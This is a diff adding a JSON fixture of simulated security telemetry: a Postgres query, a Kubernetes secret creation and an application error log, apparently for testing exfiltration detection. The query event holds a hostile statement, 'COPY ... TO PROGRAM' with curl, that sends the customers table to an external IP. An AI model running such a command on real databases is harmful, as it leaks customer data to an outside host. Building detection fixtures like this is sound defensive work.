@@ -1,0 +1,84 @@
+{
+  "tenant_id": "acme-prod",
+  "source": "sensor-batch-01",
+  "events": [
+    {
+      "event_id": "db-001",
+      "kind": "database_query",
+      "timestamp": "2026-03-15T10:00:00Z",
+      "actor": {
+        "user": "svc-payments",
+        "ip": "10.42.0.18"
+      },
+      "workload": {
+        "cluster": "prod-cluster",
+        "namespace": "payments",
+        "pod": "payments-api-5f6d7",
+        "container": "api"
+      },
+      "database": {
+        "engine": "postgres",
+        "name": "payments",
+        "session_id": "pg-991",
+        "statement": "COPY customers TO PROGRAM 'curl http://198.51.100.24/exfil' ",
+        "rows_returned": 12000
+      },
+      "network": {
+        "destination_ip": "198.51.100.24",
+        "destination_port": 443,
+        "protocol": "TCP"
+      },
+      "attributes": {
+        "latency_ms": 945,
+        "bytes_sent": 9200000
+      }
+    },
+    {
+      "event_id": "k8s-002",
+      "kind": "kubernetes_audit",
+      "timestamp": "2026-03-15T10:00:08Z",
+      "actor": {
+        "user": "svc-payments",
+        "ip": "10.42.0.18"
+      },
+      "workload": {
+        "cluster": "prod-cluster",
+        "namespace": "payments",
+        "pod": "payments-api-5f6d7",
+        "container": "api"
+      },
+      "kubernetes": {
+        "verb": "create",
+        "resource": "secrets",
+        "name": "prod-db-creds-copy"
+      },
+      "attributes": {
+        "result": "allowed"
+      }
+    },
+    {
+      "event_id": "app-003",
+      "kind": "application_log",
+      "timestamp": "2026-03-15T10:00:15Z",
+      "actor": {
+        "user": "svc-payments",
+        "ip": "10.42.0.18"
+      },
+      "workload": {
+        "cluster": "prod-cluster",
+        "namespace": "payments",
+        "pod": "payments-api-5f6d7",
+        "container": "api"
+      },
+      "application": {
+        "service": "payments-api",
+        "level": "ERROR",
+        "message": "unexpected outbound connection and elevated query latency detected"
+      },
+      "attributes": {
+        "trace_id": "trace-445",
+        "deployment": "payments-api@2026.03.15.1"
+      }
+    }
+  ]
+}
